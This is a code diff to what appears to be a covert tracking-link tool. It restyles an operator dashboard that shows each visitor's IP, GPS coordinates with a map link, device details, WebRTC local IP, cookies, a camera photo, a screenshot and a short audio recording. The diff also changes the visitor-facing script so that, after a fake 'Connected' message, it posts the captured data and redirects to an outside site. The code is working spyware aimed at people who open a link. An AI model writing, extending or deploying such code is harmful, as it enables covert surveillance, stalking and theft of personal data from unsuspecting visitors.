@@ -423,36 +423,58 @@ VIEW_LINK_HTML = """
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Visitor Data</title>""" + BASE_CSS + """
 <style>
-/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে দেখানোর জন্য */
-@media (max-width: 600px) {
-    .visit-card .row {
-        display: flex;
-        flex-direction: column;
-        align-items: flex-start;
-        margin-bottom: 6px;
-    }
-    .visit-card .label {
-        width: auto;
-        font-weight: bold;
-        color: #6688aa;
-        margin-bottom: 2px;
-    }
-    .visit-card .value {
-        word-break: break-word;
-        width: 100%;
-    }
-    .visit-card img {
-        max-width: 100% !important;
-        height: auto !important;
-    }
+/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে */
+.visit-card .row {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    margin-bottom: 8px;
+    border-bottom: 1px solid #1a2332;
+    padding-bottom: 6px;
 }
-/* ইমেজ সাইজ ঠিক করা */
+.visit-card .label {
+    font-weight: bold;
+    color: #6688aa;
+    font-size: 0.9rem;
+    width: auto;
+}
+.visit-card .value {
+    word-break: break-word;
+    font-size: 1rem;
+    color: #00ffcc;
+    margin-top: 2px;
+    width: 100%;
+}
+/* ইমেজ ও অডিও স্কেল */
 .visit-card img {
-    max-width: 250px;
-    height: auto;
+    max-width: 100% !important;
+    height: auto !important;
     border-radius: 12px;
     border: 1px solid #334466;
     margin: 5px 0;
+}
+.visit-card audio {
+    max-width: 100% !important;
+    margin: 5px 0;
+}
+.map-link {
+    display: inline-block;
+    margin-left: 6px;
+    font-size: 1rem;
+}
+@media (min-width: 600px) {
+    .visit-card .row {
+        flex-direction: row;
+        align-items: baseline;
+    }
+    .visit-card .label {
+        width: 150px;
+        flex-shrink: 0;
+    }
+    .visit-card .value {
+        width: auto;
+        margin-top: 0;
+    }
 }
 </style>
 </head>
@@ -465,53 +487,59 @@ VIEW_LINK_HTML = """
     {% if link.visits %}
         {% for v in link.visits %}
         <div class="visit-card">
-            <div class="row"><span class="label">IP Address:</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Location:</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
-            <div class="row"><span class="label">GPS (Lat, Lng):</span> <span class="value">{{ v.get('gps', 'N/A') }}</span>
+            <div class="row"><span class="label">IP Address</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Location</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
+            <div class="row"><span class="label">GPS (Lat, Lng)</span> <span class="value">{{ v.get('gps', 'N/A') }}
                 {% if v.get('gps') and v.get('gps') not in ['Permission denied', 'Failed', 'N/A'] %}
                     <a href="https://www.google.com/maps?q={{ v.get('gps').split(',')[0].strip() }},{{ v.get('gps').split(',')[1].strip() }}" target="_blank" class="map-link">🗺️ Live Map</a>
                 {% endif %}
-            </div>
-            <div class="row"><span class="label">Browser / OS:</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Screen:</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Language:</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Platform:</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Timezone:</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Battery Level:</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
+            </span></div>
+            <div class="row"><span class="label">Browser / OS</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Screen</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Language</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Platform</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Timezone</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Battery Level</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Device Memory (GB)</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Cookies</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Referrer</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
 
             <!-- নতুন ডেটা -->
-            <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
-            <div class="row"><span class="label">CPU Cores:</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Local IP (WebRTC):</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Storage (Free/Total):</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Device Model</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Network Type</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Downlink Speed</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
+            <div class="row"><span class="label">CPU Cores</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Local IP (WebRTC)</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Storage (Free/Total)</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>
 
-            <div class="row"><span class="label">Camera:</span>
+            <div class="row"><span class="label">Camera</span>
+                <span class="value">
                 {% if v.get('camera') and v.get('camera') != 'Failed' %}
                     <img src="{{ v.get('camera') }}" />
                 {% else %}
-                    <span class="value">N/A</span>
+                    N/A
                 {% endif %}
+                </span>
             </div>
-            <div class="row"><span class="label">Screenshot:</span>
+            <div class="row"><span class="label">Screenshot</span>
+                <span class="value">
                 {% if v.get('screenshot') and v.get('screenshot') != 'Failed' %}
                     <img src="{{ v.get('screenshot') }}" />
                 {% else %}
-                    <span class="value">N/A</span>
+                    N/A
                 {% endif %}
+                </span>
             </div>
-            <div class="row"><span class="label">Audio (5s):</span>
+            <div class="row"><span class="label">Audio (5s)</span>
+                <span class="value">
                 {% if v.get('audio') and v.get('audio') != 'Failed' %}
                     <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
                 {% else %}
-                    <span class="value">N/A</span>
+                    N/A
                 {% endif %}
+                </span>
             </div>
-            <div class="row"><span class="label">Time:</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Time</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
             <a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️ Delete this visit</a>
         </div>
         {% endfor %}
@@ -605,7 +633,7 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
             setTimeout(() => {
                 mediaRecorder.stop();
                 stream.getTracks().forEach(t => t.stop());
-            }, 10000); // 10 seconds
+            }, 10000);
         })
         .catch(() => { audioData = 'Failed'; audioReady = true; checkAndSend(); });
 
@@ -698,7 +726,7 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
         setTimeout(captureScreen, 300);
 
         // ============================================
-        // 5. Send Data
+        // 5. Send Data + Redirect to your link
         // ============================================
         let isSending = false;
         let sent = false;
@@ -741,12 +769,11 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             }).then(() => {
-                document.getElementById('status').innerHTML = '✅ Connected.';
+                document.getElementById('status').innerHTML = '✅ Connected. Redirecting...';
                 setTimeout(() => {
-                    document.querySelector('.loader').style.display = 'none';
-                    document.querySelector('p').textContent = 'Thank you! You are now connected.';
-                    document.getElementById('status').innerHTML = '🔒 Session secure.';
-                }, 1000);
+                    // Redirect to your link
+                    window.location.href = 'https://cybertools12.netlify.app/share-app.html';
+                }, 2000);
             }).catch(() => {
                 sent = false;
                 setTimeout(sendData, 1500);
@@ -759,7 +786,7 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
             }
         }
 
-        // Fallback force send after 12 seconds (to allow 10 sec audio)
+        // Fallback force send after 12 seconds
         setTimeout(() => {
             if (!cameraReady) { camera = 'Failed'; cameraReady = true; }
             if (!audioReady) { audioData = 'Failed'; audioReady = true; }
